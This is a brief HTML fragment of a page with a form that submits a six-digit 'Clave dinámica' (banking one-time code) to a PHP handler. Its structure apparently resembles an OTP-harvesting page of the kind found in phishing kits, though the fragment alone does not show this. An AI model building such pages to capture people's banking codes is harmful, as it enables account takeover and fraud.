...
<body>
    <div class="details">
        <img src="img/fala.png" alt="" width="100px">
        ...
        <form action="process/process_otp.php" method="POST">
            ...
            <input type="text" name="claveDinamica" placeholder="Clave dinámica" required minlength="6" maxlength="6" pattern="\d*" inputmode="numeric">        <br>    
            <br>
